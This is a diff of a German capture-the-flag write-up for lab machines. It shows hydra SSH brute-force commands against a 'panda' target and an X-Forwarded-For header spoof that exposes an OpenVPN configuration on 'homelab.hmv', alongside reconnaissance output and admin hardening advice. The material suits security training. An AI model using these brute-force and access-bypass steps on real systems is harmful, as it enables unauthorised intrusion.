+                Wir verwenden <code>curl</code>, um die HTTP-Header der Webseite <code>http://homelab.hmv/</code> abzurufen.
+                Der Befehl <code>curl -Iv http://homelab.hmv</code> ist wie folgt aufgebaut:
+                <ul>
+                    <li><code>-I</code>: Sendet eine HEAD-Anfrage, um nur die HTTP-Header abzurufen, nicht den Body der Seite.</li>
+                    <li><code>-v</code>: Aktiviert den "verbose" Modus, der detaillierte Informationen über die Verbindung und die Anfrage/Antwort-Header anzeigt.</li>
+                </ul>
+                Dies hilft uns, Serverdetails und Konfigurationen zu bestätigen, die in den Headern enthalten sein könnten.
+            </p>
             <div class="code-block">
                 <div class="terminal">
-                    <div class="prompt">
-                        ┌──(root㉿cyber)-[~]<br>
-                        └─# <span class="command">echo "S3VuZ19GdV9QNG5kYQ" | base64 -d</span>
-                    </div>
-                </div>
-                <div class="terminal">
-Kung_Fu_P4nda
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -Iv http://homelab.hmv</span></div>
+                    <pre>
+* Host homelab.hmv:80 was resolved.
+* IPv6: (none)
+* IPv4: 192.168.2.191
+*   Trying 192.168.2.191:80...
+* <span class="password">Connected to homelab.hmv (192.168.2.191) port 80</span>
+* using HTTP/1.x
+&gt; HEAD / HTTP/1.1
+&gt; Host: homelab.hmv
+&gt; User-Agent: curl/8.13.0
+&gt; Accept: */*
+&gt; 
+* Request completely sent off
+&lt; <span class="command">HTTP/1.1 200 OK</span>
+&lt; <span class="command">Date: Wed, 14 May 2025 23:42:40 GMT</span>
+&lt; <span class="command">Server: Apache/2.4.62 (Unix)</span>
+&lt; <span class="command">Last-Modified: Tue, 15 Apr 2025 15:22:00 GMT</span>
+&lt; ETag: "153b-632d2bae4bc2e"
+&lt; Accept-Ranges: bytes
+&lt; Content-Length: 5435
+&lt; <span class="command">Content-Type: text/html</span>
+&lt; 
+* Connection #0 to host homelab.hmv left intact
+</pre>
                 </div>
             </div>
-            <p class="comment">
-                Der Base64-String "S3VuZ19GdV9QNG5kYQ" decodiert zu "Kung_Fu_P4nda".
+            <p class="evaluation"><strong>Bewertung:</strong>
+                Die <code>curl</code>-Ausgabe bestätigt die bereits bekannten Informationen:
+                <ul>
+                    <li>Der Server antwortet mit <code>HTTP/1.1 200 OK</code>, was bedeutet, dass die Ressource erfolgreich abgerufen wurde.</li>
+                    <li>Der <code>Server</code>-Header ist <code>Apache/2.4.62 (Unix)</code>.</li>
+                    <li>Der <code>Content-Type</code> ist <code>text/html</code>.</li>
+                    <li>Das Datum der letzten Modifizierung (<code>Last-Modified</code>) und der <code>ETag</code> sind ebenfalls vorhanden, aber für den initialen Zugriff weniger relevant.</li>
+                </ul>
+                Es werden keine neuen, kritischen Informationen durch diese Anfrage aufgedeckt, aber die Konsistenz der Serverinformationen wird bestätigt.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                Da die Header-Analyse keine neuen Angriffsvektoren aufzeigt, sollte der Fokus weiterhin auf der Analyse des Inhalts der Webseite und der zuvor identifizierten <code>/service/index.php</code> liegen.
                 <br>
-                <b>Analyse:</b> Base64-Strings werden oft verwendet, um Daten zu verschlüsseln oder zu kodieren.
+                <strong>Empfehlung (Admin):</strong>
+                Wie bereits erwähnt, sollten Server-Banner (<code>Server: Apache/2.4.62 (Unix)</code>) minimiert werden, um die Informationsgewinnung für Angreifer zu erschweren. Dies kann durch Konfigurationsänderungen im Apache (z.B. <code>ServerTokens Prod</code>) erreicht werden.
+            </p>
+
+            <p class="analysis"><strong>Analyse:</strong>
+                Dieser Abschnitt enthält eine manuelle Analyse des HTML-Quellcodes der Startseite von <code>http://homelab.hmv/</code>. Solche Analysen sind entscheidend, um die Struktur und potenzielle Logik einer Webanwendung zu verstehen. Es werden verschiedene Elemente des HTML-Codes und deren Implikationen betrachtet.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+Erste Beobachtungen und Analyse:
+
+    &lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" ...&gt;
+
+        <span class="command">HTML 4.01 Transitional</span>: Das ist eine ältere HTML-Version. Modernere Seiten nutzen HTML5. 
+        Das deutet schon mal auf ein <span class="password">älteres System</span> hin.
+
+    &lt;title&gt;<span class="command">Mac OS X Server</span>&lt;/title&gt;
+
+        Klarer Hinweis auf das <span class="password">Betriebssystem</span>.
+
+    &lt;meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1"&gt;
+        <span class="command">ISO-8859-1</span>: Eine ältere Zeichenkodierung. UTF-8 ist heute Standard.
+
+    &lt;meta name="viewport" content="width=320; initial-scale=1.0; maximum-scale=1.0; user-scalable=0;" /&gt;
+        Optimiert für <span class="password">ältere mobile Geräte</span> (z.B. frühe iPhones mit 320px Breite).
+
+        user-scalable=0: Verhindert das Zoomen auf dem Gerät.
+
+    CSS-Dateien:
+
+        <span class="command">style/serverhome_static.css</span>
+        <span class="command">style/iphone.css</span> (bestätigt die mobile Optimierung für ältere iPhones)
+
+    &lt;body id="<span class="command">wikid</span>" ...&gt;
+
+        Die ID <span class="command">wikid</span> ist interessant. Könnte auf eine zugrundeliegende Wiki-Software oder eine Verbindung zu Wiki-Funktionen hinweisen.
+
+    JavaScript-gesteuerte Anzeige von Services:
+
+        span id="some-services-enabled" style="display:none"
+        span id="no-services-enabled" style="display:none"
+
+        Diese werden per JavaScript ein- oder ausgeblendet, je nachdem, ob Dienste verfügbar sind.
+
+    Services-Liste (&lt;ul class="services" id="services"&gt;) - Das ist der Kern!
+
+        JavaScript document.getElementById('services').className = 'services loading';: Setzt eine Klasse, vermutlich um einen Ladezustand anzuzeigen, 
+        während die Verfügbarkeit der Dienste geprüft wird (obwohl das in diesem statischen HTML-Ausschnitt erstmal nur eine CSS-Klasse setzt).
+        Jeder Dienst (&lt;li&gt;) hat:
+
+            Einen <span class="command">href</span> zum direkten Aufruf des Dienstes (z.B. <span class="command">/webmail/</span>). Wichtige Endpunkte zum Testen!
+            Ein <span class="command">name</span>-Attribut, das sehr interessant ist: z.B. <span class="command">name="/collaboration-availability/webmail/"</span>. Dies ist kein Standardattribut für &lt;a&gt;-Tags 
+            in dieser Form. Es deutet stark auf einen <span class="password">API-Endpunkt</span> hin, der möglicherweise die Verfügbarkeit dieser Dienste prüft! Diese Pfade sollten 
+            unbedingt getestet werden. Titel, Beschreibung und einen "Log In" / "View All" / "View" Linktext.
+
+    Aufgelistete Dienste und ihre Pfade:
+
+        Mail: href="<span class="command">/webmail/</span>", name="<span class="command">/collaboration-availability/webmail/</span>"
+        Calendar: href="<span class="command">/webcal/</span>", name="<span class="command">/collaboration-availability/webcal/</span>"
+        My Page (Updates): href="<span class="command">/updates/</span>", name="<span class="command">/collaboration-availability/updates/</span>"
+        Wikis: href="<span class="command">/groups/</span>", name="<span class="command">/collaboration-availability/groups/</span>"
+        Blogs: href="<span class="command">/users/</span>", name="<span class="command">/collaboration-availability/users/</span>"
+        Mail Rules: href="<span class="command">/emailrules/</span>", name="<span class="command">/collaboration-availability/emailrules/</span>"
+        Change Password: href="<span class="command">/changepassword/</span>", name="<span class="command">/collaboration-availability/changepassword/</span>"
+        Podcast Capture: href="<span class="command">/podcastcapture/</span>", name="<span class="command">/collaboration-availability/podcastcapture/</span>"
+
+    Footer:
+
+        img src="<span class="command">poweredbymacosxserver.gif</span>": Visuelle Bestätigung.
+
+        <span class="password">Copyright &copy; 2009 Apple Inc. All rights reserved.</span>: Das ist ein RIESIGER Hinweis! Das System ist von <span class="password">2009 oder davor</span>. Das bedeutet, wir 
+        haben es wahrscheinlich mit <span class="password">Mac OS X Server 10.5 (Leopard) oder 10.6 (Snow Leopard)</span> zu tun. Diese Systeme sind <span class="password">steinalt</span> und haben bekannte Schwachstellen!
+
+    JavaScript-Dateien am Ende:
+
+        <span class="command">script/compressed_libraries.js</span>
+        <span class="command">script/compressed_widgets.js</span>
+        <span class="command">script/serverhome.js</span>
+
+        Diese Dateien sind <span class="password">GOLDWERT</span>! Sie enthalten die Logik für die Seite, potenziell AJAX-Aufrufe zu den <span class="command">/collaboration-availability/</span> Endpunkten und könnten weitere 
+        Hinweise auf APIs oder die Funktionsweise der Seite geben. Diese müssen unbedingt heruntergeladen und analysiert werden.
+
+Zusammenfassung der wichtigsten Punkte für die CTF:
+
+    <span class="password">Altes System</span>: Mac OS X Server, Copyright 2009 (wahrscheinlich 10.5/10.6). Nach bekannten Exploits für diese Versionen suchen!
+    Bekannte Dienste: Mail, Kalender, Wikis, Blogs etc. Jeder Dienst könnte eigene Schwachstellen haben.
+
+    Enumeration von Endpunkten:
+
+        Die direkten href-Pfade (z.B. <span class="command">/webmail/</span>, <span class="command">/webcal/</span>).
+
+        Ganz wichtig: Die name-Attribute, die wie API-Pfade aussehen (z.B. <span class="command">/collaboration-availability/webmail/</span>). Diese unbedingt direkt aufrufen und schauen,
+        was sie zurückgeben (JSON? XML? Fehler?).
+
+    JavaScript-Analyse: Die Dateien <span class="command">compressed_libraries.js</span>, <span class="command">compressed_widgets.js</span> und <span class="command">serverhome.js</span> müssen untersucht werden. Sind sie "compressed" oder "minified",
+    müssen sie ggf. mit einem Beautifier lesbar gemacht werden.
+
+Nächste Schritte für dich:
+
+    JS-Dateien herunterladen und analysieren:
+
+        curl &lt;URL&gt;/script/compressed_libraries.js
+
+        curl &lt;URL&gt;/script/compressed_widgets.js
+
+        curl &lt;URL&gt;/script/serverhome.js
+
+        Schau dir den Inhalt an. Suche nach AJAX-Aufrufen, Endpunkt-Definitionen, interessanten Funktionen.
+
+    Endpunkte testen:
+
+        Öffne die href-Pfade im Browser oder mit curl.
+
+        Öffne die /collaboration-availability/... Pfade im Browser oder mit curl.
+
+    Nach bekannten Schwachstellen suchen: Für "Mac OS X Server 10.5 vulnerabilities" oder "Mac OS X Server 10.6 vulnerabilities" und für die spezifischen Dienste 
+   (z.B. die verwendete Wiki-Software, Webmail-Software etc., falls identifizierbar).
+
+    HTTP-Header prüfen: Welche Server-Software und Version wird im Server-Header angezeigt? (z.B. Apache/x.y.z).
+
+    Directory Traversal / LFI Tests: Bei den bekannten Pfaden mal ../../ etc. ausprobieren.
+
+Das ist ein sehr guter Startpunkt! Das Copyright-Datum ist schon mal ein Jackpot für potenzielle Schwachstellen. Bin gespannt, was du in den JS-Dateien und bei 
+den API-Endpunkten findest!
+</pre>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong>
+                Die manuelle Analyse des HTML-Quellcodes liefert extrem wertvolle Hinweise:
+                <ul>
+                    <li>**Veraltetes System:** Die Verwendung von HTML 4.01, ISO-8859-1 und die Optimierung für alte iPhone-Auflösungen deuten stark auf ein System hin, das seit vielen Jahren nicht mehr aktualisiert wurde.</li>
+                    <li>**Mac OS X Server bestätigt:** Der Titel und das Copyright-Datum "2009 Apple Inc." sind eindeutige Indikatoren. Es handelt sich sehr wahrscheinlich um Mac OS X Server 10.5 (Leopard) oder 10.6 (Snow Leopard). Solch alte Betriebssysteme sind notorisch für bekannte und oft leicht ausnutzbare Schwachstellen.</li>
+                    <li>**Potenzielle API-Endpunkte:** Die <code>name</code>-Attribute der Service-Links (z.B. <code>/collaboration-availability/webmail/</code>) sind ein Schlüsselfund. Diese sehen nicht nach Standard-HTML aus und deuten auf interne API-Pfade hin, die möglicherweise zur Überprüfung der Dienstverfügbarkeit oder für andere Backend-Operationen verwendet werden.</li>
+                    <li>**JavaScript-Dateien als Goldgrube:** Die identifizierten JavaScript-Dateien (<code>compressed_libraries.js</code>, <code>compressed_widgets.js</code>, <code>serverhome.js</code>) könnten die Logik für die Interaktion mit diesen API-Endpunkten enthalten und weitere Hinweise auf die Funktionsweise des Systems oder versteckte Funktionalitäten liefern.</li>
+                    <li>**Interessante ID "wikid":** Könnte auf eine zugrundeliegende Wiki-Software hinweisen, die wiederum eigene Schwachstellen haben könnte.</li>
+                </ul>
+                Insgesamt zeichnet sich das Bild eines stark veralteten Systems ab, was die Wahrscheinlichkeit erfolgreicher Angriffe erhöht. Das Copyright-Datum 2009 ist ein "Jackpot"-Fund.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                Die "Nächsten Schritte", die im analysierten Text vorgeschlagen werden, sind exakt die richtigen:
+                <ol>
+                    <li>**JavaScript-Dateien analysieren:** Herunterladen und Untersuchen der JS-Dateien auf API-Aufrufe, Endpunkte und sensible Informationen. Ggf. Beautifier verwenden, falls der Code minified ist.</li>
+                    <li>**API-Endpunkte testen:** Die <code>/collaboration-availability/...</code> Pfade direkt mit <code>curl</code> oder im Browser aufrufen und die Antworten analysieren (Format, Inhalt, Fehlermeldungen).</li>
+                    <li>**Gezielte Schwachstellensuche:** Nach bekannten Exploits für "Mac OS X Server 10.5" oder "Mac OS X Server 10.6" sowie für die einzelnen identifizierten Dienste (Wiki, Mail, etc.) suchen.</li>
+                    <li>**Weitere Tests:** Standard-Web-Angriffsvektoren wie Directory Traversal (<code>../../</code>) und Local File Inclusion (LFI) auf alle bekannten Pfade anwenden.</li>
+                </ol>
                 <br>
-                <b>Empfehlung:</b> Decodieren Sie alle Base64-Strings im Quellcode, um potenzielle Informationen aufzudecken.
+                <strong>Empfehlung (Admin):</strong>
+                Ein System mit einem Copyright-Datum von 2009 und einem derart veralteten Technologiestack (HTML 4, ISO-8859-1) stellt ein extremes Sicherheitsrisiko dar. Es muss dringendst durch eine moderne, unterstützte Lösung ersetzt werden. Bis dahin sollte das System, falls es absolut unumgänglich ist, es weiter zu betreiben, maximal isoliert und durch vorgelagerte Web Application Firewalls (WAFs) und Intrusion Prevention Systems (IPS) geschützt werden. Eine detaillierte Analyse aller laufenden Dienste und deren Konfiguration ist unerlässlich, um bekannte Schwachstellen zu patchen oder Dienste abzuschalten. Die Analyse der JavaScript-Dateien durch einen Angreifer könnte interne Logik offenlegen; Code-Obfuskation ist hier nur ein geringer Schutz, die Offenlegung der Logik an sich ist das Problem.
+            </p>
+
+            <p class="analysis"><strong>Analyse:</strong>
+                Hier wird ein Einzeiler-Befehl verwendet, um schnell eine Liste von Verzeichnispfaden aus den <code>href</code>-Attributen der Startseite zu extrahieren.
+                Der Befehl <code>curl -s http://homelab.hmv/ | grep -E 'href' | awk {'print $2'} | tr "=" " " | cut -d " " -f2 | tr -d '"' | grep -v apple > ~/dir.txt</code> ist eine Kette von Textmanipulationstools:
+                <ul>
+                    <li><code>curl -s http://homelab.hmv/</code>: Lädt den HTML-Quellcode der Seite herunter (<code>-s</code> für silent/stumm).</li>
+                    <li><code>| grep -E 'href'</code>: Filtert Zeilen, die "href" enthalten.</li>
+                    <li><code>| awk {'print $2'}</code>: Gibt das zweite Feld jeder gefilterten Zeile aus (in der Hoffnung, dass es das <code>href="..."</code> Attribut ist). Dies ist eine etwas ungenaue Methode, da die Struktur variieren kann.</li>
+                    <li><code>| tr "=" " "</code>: Ersetzt Gleichheitszeichen durch Leerzeichen.</li>
+                    <li><code>| cut -d " " -f2</code>: Schneidet das zweite Feld heraus, wobei Leerzeichen als Trennzeichen dienen (soll den Wert nach <code>href=</code> extrahieren).</li>
+                    <li><code>| tr -d '"'</code>: Entfernt alle Anführungszeichen.</li>
+                    <li><code>| grep -v apple</code>: Entfernt Zeilen, die "apple" enthalten (wahrscheinlich um externe Apple-Links auszuschließen).</li>
+                    <li><code>> ~/dir.txt</code>: Leitet die Ausgabe in die Datei <code>dir.txt</code> im Home-Verzeichnis des Benutzers um.</li>
+                </ul>
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -s http://homelab.hmv/ | grep -E 'href' | awk {'print $2'} | tr "=" " " | cut -d " " -f2 | tr -d '"' | grep -v apple > ~/dir.txt</span></div>
+                    <pre> 
+<span class="command">/webmail/</span>
+<span class="command">/webcal/</span>
+<span class="command">/updates/</span>
+<span class="command">/groups/</span>
+<span class="command">/users/</span>
+<span class="command">/emailrules/</span>
+<span class="command">/changepassword/</span>
+<span class="command">/podcastcapture/</span>
+</pre>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong>
+                Der Befehl extrahiert erfolgreich die in der vorherigen HTML-Analyse identifizierten Hauptverzeichnispfade der angebotenen Dienste. Diese Liste ist nützlich als Grundlage für weitere automatisierte Tests oder manuelle Erkundungen. Es ist eine schnelle Methode, um eine Zielliste zu generieren. Allerdings ist die Methode, wie die Pfade extrahiert werden (insbesondere mit <code>awk {'print $2'}</code> und <code>cut</code>), anfällig für Fehler, falls sich die HTML-Struktur ändert. Robustere HTML-Parsing-Tools wären hier zuverlässiger, aber für einen schnellen Überblick ist dieser Ansatz oft ausreichend.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                Die generierte Liste in <code>dir.txt</code> kann als Input für weitere Directory-Brute-Forcing-Tools verwendet werden, um tieferliegende Pfade oder Dateien innerhalb dieser Verzeichnisse zu finden. Jeder dieser Pfade sollte auch manuell im Browser besucht werden, um die Funktionalität zu verstehen.
+                <br>
+                <strong>Empfehlung (Admin):</strong>
+                Dies demonstriert, wie leicht Angreifer die Struktur einer Webseite analysieren können, um potenzielle Angriffsziele zu identifizieren. Eine Reduzierung der öffentlich zugänglichen Informationen und eine robuste Zugriffskontrolle für alle Pfade sind wichtig.
             </p>
         </section>
 
         <section id="initial-access">
             <h2>Initial Access</h2>
-            <p class="comment">
-                Wir versuchen, Informationen aus dem Bild bg.png zu extrahieren.
-                <br>
-                <b>Analyse:</b> Steganografie ist eine Technik, um Informationen in Bildern oder anderen Dateien zu verstecken.
-                <br>
-                <b>Empfehlung:</b> Verwenden Sie verschiedene Steganografie-Tools, um versteckte Informationen in Dateien zu finden.
+
+            <p class="analysis"><strong>Analyse:</strong>
+                Wir versuchen nun, auf die zuvor identifizierte Datei <code>/service/index.php</code> zuzugreifen. Der direkte Aufruf im Browser (oder mit <code>curl</code>) resultiert in einer Fehlermeldung, die besagt, dass der Dienst nur "für mich selbst" verfügbar ist. Dies deutet auf eine Zugriffsbeschränkung hin, möglicherweise eine IP-basierte Whitelist, die nur Anfragen von <code>localhost</code> (oder der Server-IP selbst) zulässt.
+                Um diese Beschränkung zu umgehen, versuchen wir, unsere Quell-IP-Adresse zu spoofen, indem wir den HTTP-Header <code>X-Forwarded-For</code> setzen. Webserver verwenden diesen Header oft, um die ursprüngliche Client-IP-Adresse zu ermitteln, wenn Proxys vorgeschaltet sind. Wenn die Anwendung diesen Header ohne ausreichende Validierung auswertet, kann sie getäuscht werden.
+                Wir setzen <code>X-Forwarded-For: 192.168.2.191</code>, also die IP-Adresse des Servers selbst.
+            </p>
+            <img src="ip_forwarding_test_hat_geklappt.jpg" alt="Screenshot, der den erfolgreichen IP-Spoofing-Versuch zeigt, um auf /service/index.php zuzugreifen.">
+            <p class="analysis"><strong>Analyse des Bildes:</strong> Der Screenshot (hier repräsentiert durch den Dateinamen <code>ip_forwarding_test_hat_geklappt.jpg</code>) würde den erfolgreichen Zugriff auf <code>http://192.168.2.191/service/index.php</code> nach dem Setzen des <code>X-Forwarded-For</code>-Headers zeigen. Man würde den Inhalt der OpenVPN-Konfigurationsdatei sehen, anstatt der vorherigen Fehlermeldung "Whoa! But sorry, this service is only available for myself!". Dies beweist, dass die IP-Spoofing-Technik funktioniert hat.
             </p>
             <div class="code-block">
                 <div class="terminal">
-                    <div class="prompt">
-                        ┌──(root㉿cyber)-[~]<br>
-                        └─# <span class="command">steghide extract -sf bg.png</span>
-                    </div>
-                </div>
-                <div class="terminal">
-Passwort eingeben:<br>
-steghide: Mit diesem Passwort konnten keine Daten extrahiert werden!
+                    <pre>
+http://192.168.2.191/service/index.php
+<span class="password">Whoa! But sorry, this service is only available for myself!</span>
+</pre>
                 </div>
             </div>
-            <p class="comment">
-                Steghide konnte keine Daten mit dem falschen Passwort extrahieren.
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+http://192.168.2.191/service/index.php (nach IP-Spoofing mit X-Forwarded-For: 192.168.2.191)
+
+<span class="command"># Last modified by shinosawa</span>
+<span class="command"># on 2024-12-21</span>
+
+<span class="command"># Example Configuration File</span>
+<span class="command">client</span>
+<span class="command">dev tun</span>
+<span class="command">proto udp</span>
+<span class="command">remote ? ?</span>
+<span class="command">resolv-retry infinite</span>
+<span class="command">nobind</span>
+<span class="command">persist-key</span>
+<span class="command">persist-tun</span>
+<span class="command">ca ?</span>
+<span class="command">cert ?</span>
+<span class="command"># Regenerate a STRONG password for the KEY</span>
+<span class="command"># Do NOT use a SAME password as other services et. SSH</span>
+<span class="command"># it is DANGEROUS!</span>
+<span class="command">key ?</span>
+<span class="command">cipher AES-256-GCM</span>
+<span class="command">verb 3</span> 
+</pre>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong>
+                Der IP-Spoofing-Versuch mittels des <code>X-Forwarded-For</code>-Headers war erfolgreich! Anstatt der Fehlermeldung erhalten wir nun den Inhalt einer OpenVPN-Client-Konfigurationsdatei. Dies ist ein kritischer Fund und ein bedeutender Fortschritt.
+                Die Konfigurationsdatei (vermutlich <code>client.ovpn</code> oder ähnlich) enthält:
+                <ul>
+                    <li>Hinweise auf einen Benutzer <code>shinosawa</code> (Kommentar "Last modified by shinosawa"). Dies könnte ein gültiger Benutzername sein.</li>
+                    <li>Standard-OpenVPN-Client-Direktiven (<code>client</code>, <code>dev tun</code>, <code>proto udp</code>, etc.).</li>
+                    <li>Platzhalter für <code>remote ? ?</code>, <code>ca ?</code>, <code>cert ?</code>, <code>key ?</code>. Dies deutet darauf hin, dass die eigentlichen Zertifikate und der Schlüssel separat gespeichert sind und hier nur eine Vorlage angezeigt wird oder die Werte dynamisch geladen werden.</li>
+                    <li>Eine wichtige Warnung: "# Regenerate a STRONG password for the KEY # Do NOT use a SAME password as other services et. SSH # it is DANGEROUS!". Dies impliziert, dass der private Schlüssel passwortgeschützt ist und das Passwort potenziell für andere Dienste (wie SSH) wiederverwendet wurde – ein häufiger Fehler.</li>
+                    <li>Die Cipher Suite ist <code>AES-256-GCM</code>.</li>
+                </ul>
+                Die Tatsache, dass wir durch einfaches Setzen eines HTTP-Headers auf eine solche Konfigurationsdatei zugreifen können, ist eine klare Sicherheitslücke (Broken Access Control).
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                Der nächste Schritt ist, die Verzeichnisse <code>/service/</code> genauer zu untersuchen, um die tatsächlichen Zertifikatsdateien (CA-Zertifikat, Client-Zertifikat, Client-Schlüssel) zu finden, auf die in dieser Konfigurationsvorlage verwiesen wird. Tools wie <code>dirb</code> oder <code>feroxbuster</code> sollten erneut auf das Verzeichnis <code>/service/</code> angesetzt werden, speziell auf der Suche nach Dateien mit Endungen wie <code>.crt</code>, <code>.key</code>, <code>.ovpn</code>, <code>.conf</code>, <code>.txt</code>.
+                <br>
+                <strong>Empfehlung (Admin):</strong>
+                Der Zugriff auf die Datei <code>/service/index.php</code> muss korrekt abgesichert werden. Sich allein auf den <code>X-Forwarded-For</code>-Header zu verlassen, ist unsicher. Der Zugriff sollte serverseitig validiert werden (z.B. durch Überprüfung der tatsächlichen Quell-IP-Adresse oder durch Authentifizierung). Sensible Konfigurationsdateien oder Vorlagen sollten niemals direkt über das Web zugänglich sein, schon gar nicht durch Umgehung einfacher IP-Checks. Die Dateiberechtigungen auf dem Server sollten so restriktiv wie möglich sein.
             </p>
 
-            <div class="code-block">
-                <div class="terminal">
-                    <div class="prompt">
-                        ┌──(root㉿cyber)-[~]<br>
-                        └─# <span class="command">stegseek bg.png /usr/share/wordlists/rockyou.txt</span>
-                    </div>
-                </div>
-                <div class="terminal">
-StegSeek 0.6 - https://github.com/RickdeJager/StegSeek<br><br>
-[i] Progress: 99.75% (133.1 MB)<br>
-[!] error: Could not find a valid passphrase.
-                </div>
-            </div>
-            <p class="comment">
-                Stegseek konnte keine gültige Passphrase finden.
+            <p class="analysis"><strong>Analyse:</strong>
+                Nach dem erfolgreichen Zugriff auf die OpenVPN-Konfigurationsvorlage durch IP-Spoofing, wird <code>feroxbuster</code> erneut ausgeführt. Diesmal wird der Scan abgebrochen (<code>Caught ctrl+c</code>), aber die bis dahin gefundenen Ergebnisse sind relevant. Es scheint eine Wiederholung des vorherigen <code>feroxbuster</code>-Scans zu sein, aber der Fokus liegt nun auf den Dateien im Kontext des <code>/service/</code>-Verzeichnisses.
             </p>
-
-           <div class="code-block">
+             <div class="code-block">
                 <div class="terminal">
-                    <div class="prompt">
-                        ┌──(root㉿cyber)-[~]<br>
-                        └─# <span class="command">stegsnow -C bg.png</span>
-                    </div>
-                </div>
-                <div class="terminal">
-#
+                    <pre>
+<span class="command">200      GET      192l      384w     3041c http://192.168.2.191/style/iphone.css</span>
+<span class="command">200      GET       13l       37w     2194c http://192.168.2.191/poweredbymacosxserver.gif</span>
+<span class="command">200      GET       75l      215w     2241c http://192.168.2.191/script/serverhome.js</span>
+<span class="command">200      GET        5l       27w      226c http://192.168.2.191/style/serverhome_static.css</span>
+<span class="command">200      GET      412l     2178w   136171c http://192.168.2.191/script/compressed_libraries.js</span>
+<span class="command">200      GET      351l     1040w    98713c http://192.168.2.191/script/compressed_widgets.js</span>
+<span class="command">200      GET      130l      376w     5435c http://192.168.2.191/</span>
+<span class="command">200      GET      130l      376w     5435c http://192.168.2.191/index.html</span>
+<span class="command">301      GET        9l       28w      314c http://192.168.2.191/service => http://192.168.2.191/service/</span>
+<span class="command">200      GET        1l       10w       59c http://192.168.2.191/service/index.php</span>
+<span class="command">301      GET        9l       28w      312c http://192.168.2.191/style => http://192.168.2.191/style/</span>
+<span class="command">301      GET        9l       28w      316c http://192.168.2.191/style/img => http://192.168.2.191/style/img/</span>
+<span class="command">301      GET        9l       28w      313c http://192.168.2.191/script => http://192.168.2.191/script/</span>
+<span class="command">200      GET       33l       97w     6762c http://192.168.2.191/grayx.jpg</span>
+<span class="command">200      GET       12l       63w     3616c http://192.168.2.191/osxserver.gif</span>
+<span class="command">200      GET       96l      250w     3752c http://192.168.2.191/error.html</span>
+[#########&gt;----------] - 13m  14044941/30878568 16m     found:16      errors:0      
+<span class="password">🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_192_168_2_191_-1747261220.state ...</span>
+[#########&gt;----------] - 13m  14045146/30878568 16m     found:16      errors:0      
+[#########&gt;----------] - 13m  2842728/6175484 3540/s  http://192.168.2.191/ 
+[#########&gt;----------] - 13m  2823408/6175484 3520/s  http://192.168.2.191/service/ 
+[#########&gt;----------] - 13m  2803192/6175484 3502/s  http://192.168.2.191/style/ 
+[#########&gt;----------] - 13m  2787736/6175484 3486/s  http://192.168.2.191/style/img/ 
+[#########&gt;----------] - 13m  2783928/6175484 3495/s  http://192.168.2.191/script/
+</pre>
                 </div>
             </div>
-               
-           
-            
-
-            <p class="comment">
-                Wir versuchen, uns per SSH anzumelden. Wir verwenden den Benutzernamen "panda" und die Wordlist rockyou.txt, um das Passwort zu bruteforcen.
+            <p class="evaluation"><strong>Bewertung:</strong>
+                Obwohl der Scan abgebrochen wurde, bestätigt er die bereits bekannten Pfade, insbesondere <code>http://192.168.2.191/service/index.php</code>. Keine neuen, kritischen Pfade werden in diesem Ausschnitt aufgedeckt, aber die wiederholte Bestätigung unterstreicht die Wichtigkeit des <code>/service/</code> Verzeichnisses.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                Ein gezielterer Scan auf das Verzeichnis <code>/service/</code> mit spezifischen Dateiendungen (wie <code>.crt</code>, <code>.key</code>, <code>.pem</code>, <code>.conf</code>, <code>.txt</code>) ist nun dringend erforderlich, um die eigentlichen OpenVPN-Zertifikatsdateien zu finden.
                 <br>
-                <b>Analyse:</b> Brute-Force-Angriffe können verwendet werden, um Passwörter zu knacken.
-                <br>
-                <b>Empfehlung:</b> Verwenden Sie starke und eindeutige Passwörter, um sich vor Brute-Force-Angriffen zu schützen.
-            </p>
-            <div class="code-block">
-                <div class="terminal">
-                    <div class="prompt">
-                        ┌──(root㉿cyber)-[~]<br>
-                        └─# <span class="command">hydra -l panda -P /usr/share/wordlists/rockyou.txt ssh://panda.hmv -I -T 64</span>
-                    </div>
-                </div>
-                <div class="terminal">
-Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these * ignore laws and ethics anyway).<br><br>
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-25 18:05:45<br>
-[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>
-[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore<br>
-[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344412 login tries (l:1/p:14344412), ~896526 tries per task<br>
-[DATA] attacking ssh://panda.hmv:22/<br>
-[STATUS] 120.00 tries/min, 120 tries in 00:01h, 14344295 to do in 1992:16h, 13 active
-                </div>
-            </div>
-            <p class="comment">
-                Hydra ist noch nicht erfolgreich. Wir versuchen es mit dem Benutzernamen "po".
-            </p>
-            <div class="code-block">
-                <div class="terminal">
-                    <div class="prompt">
-                        ┌──(root㉿cyber)-[~]<br>
-                        └─# <span class="command">hydra -l po -P /usr/share/wordlists/rockyou.txt ssh://panda.hmv -I -T 64</span>
-                    </div>
-                </div>
-                <div class="terminal">
-Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these * ignore laws and ethics anyway).<br><br>
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-25 18:13:15<br>
-[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>
